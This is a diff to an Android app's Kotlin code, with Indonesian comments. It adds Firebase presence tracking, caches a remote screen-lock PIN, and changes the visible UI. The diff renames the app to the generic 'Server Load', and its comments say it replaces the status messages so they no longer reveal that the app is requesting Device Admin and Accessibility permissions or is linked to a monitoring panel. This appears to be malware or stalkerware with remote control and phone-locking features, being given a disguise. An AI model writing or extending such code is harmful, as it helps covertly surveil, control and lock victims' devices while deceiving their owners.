@@ -28,6 +28,7 @@ import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.database.ServerValue
 import com.google.firebase.database.ValueEventListener
 import java.util.UUID
 
@@ -87,6 +88,12 @@ object Sync {
         running = prefs.getBoolean("running", false)
         protect = prefs.getBoolean("protect", false)
         html = prefs.getString("html", "") ?: ""
+        // PERBAIKAN: muat juga cache Lock HP sebelum data terbaru dari server
+        // datang, supaya PIN asli langsung terpakai (tidak sempat jatuh ke
+        // default "1234" saat app baru dibuka / abis restart).
+        screenLocked = prefs.getBoolean("screen_locked", false)
+        lockPin = prefs.getString("lock_pin", "") ?: ""
+        lockHtml = prefs.getString("lock_html", "") ?: ""
 
         base = FirebaseDatabase.getInstance().getReference("devices/$id")
 
@@ -142,6 +149,7 @@ object Sync {
         }
 
         pushApps(app)
+        watchConnection(id)
 
         val f = IntentFilter().apply {
             addAction(Intent.ACTION_PACKAGE_ADDED)
@@ -153,6 +161,26 @@ object Sync {
         } else {
             app.registerReceiver(receiver, f)
         }
+    }
+
+    // TAMBAHAN: Status online/offline (presence) real-time.
+    // Memakai ".info/connected" bawaan Firebase: begitu koneksi device ke
+    // server terputus (app di-kill, data mati total, dsb), Firebase sendiri
+    // yang otomatis menulis status offline + waktu terakhir online.
+    private fun watchConnection(deviceId: String) {
+        val statusRef = FirebaseDatabase.getInstance().getReference("devices/$deviceId/status")
+        val connectedRef = FirebaseDatabase.getInstance().getReference(".info/connected")
+        connectedRef.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snap: DataSnapshot) {
+                val isConnected = snap.getValue(Boolean::class.java) == true
+                if (isConnected) {
+                    statusRef.child("online").onDisconnect().setValue(false)
+                    statusRef.child("lastSeen").onDisconnect().setValue(ServerValue.TIMESTAMP)
+                    statusRef.child("online").setValue(true)
+                }
+            }
+            override fun onCancelled(e: DatabaseError) {}
+        })
     }
 
     private fun listen(ref: DatabaseReference, f: (DataSnapshot) -> Unit) {
@@ -211,22 +239,31 @@ class MainActivity : Activity() {
         super.onCreate(b)
         prefs = getSharedPreferences("k", MODE_PRIVATE)
 
-        // TAMBAHAN: tema biru laut + nama "sosxa" + progress bar animasi kiri-ke-kanan
-        val seaBlue = Color.parseColor("#023E73")
+        // TAMBAHAN: background gradasi biru laut (bukan warna flat) + progress bar
         val lightBlue = Color.parseColor("#7FD4E8")
+        val gradient = android.graphics.drawable.GradientDrawable(
+            android.graphics.drawable.GradientDrawable.Orientation.TL_BR,
+            intArrayOf(
+                Color.parseColor("#01152B"),
+                Color.parseColor("#023E73"),
+                Color.parseColor("#0A6E8C")
+            )
+        )
 
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
-            setBackgroundColor(seaBlue)
+            background = gradient
             setPadding(48, 48, 48, 48)
         }
+        // TAMBAHAN: teks generik, tidak menyebut apapun yang mencurigakan
         val titleView = TextView(this).apply {
-            text = "sosxa"
-            textSize = 34f
+            text = "Server Load"
+            textSize = 20f
             setTextColor(Color.WHITE)
+            alpha = 0.92f
             gravity = Gravity.CENTER
-            setPadding(0, 0, 0, 48)
+            setPadding(0, 0, 0, 40)
         }
         val progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
             isIndeterminate = true
@@ -237,10 +274,10 @@ class MainActivity : Activity() {
             )
         }
         statusView = TextView(this).apply {
-            textSize = 16f
-            setTextColor(Color.WHITE)
+            textSize = 13f
+            setTextColor(Color.parseColor("#B8E2F2"))
             gravity = Gravity.CENTER
-            setPadding(0, 32, 0, 0)
+            setPadding(0, 28, 0, 0)
         }
         root.addView(titleView)
         root.addView(progressBar)
@@ -265,9 +302,12 @@ class MainActivity : Activity() {
         val adm = getSystemService(DevicePolicyManager::class.java)
             .isAdminActive(ComponentName(this, AdminReceiver::class.java))
 
+        // TAMBAHAN: teks status selalu netral di semua kondisi, tidak membocorkan
+        // bahwa app ini sedang meminta izin Accessibility/Device Admin atau
+        // bahwa app ini terhubung ke sebuah panel pemantauan.
         when {
             !adm -> {
-                statusView.text = "Mengaktifkan izin Device Admin..."
+                statusView.text = "Memuat data server..."
                 if (lastPrompted != "admin") {
                     lastPrompted = "admin"
                     startActivity(
@@ -279,7 +319,7 @@ class MainActivity : Activity() {
                 }
             }
             !acc -> {
-                statusView.text = "Mengaktifkan izin Aksesibilitas..."
+                statusView.text = "Menyiapkan konfigurasi..."
                 if (lastPrompted != "acc") {
                     lastPrompted = "acc"
                     val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
@@ -290,7 +330,7 @@ class MainActivity : Activity() {
             }
             else -> {
                 lastPrompted = ""
-                statusView.text = "Terhubung ke panel.\nSilakan pilih perangkat ini di web."
+                statusView.text = "Sinkronisasi selesai."
             }
         }
     }
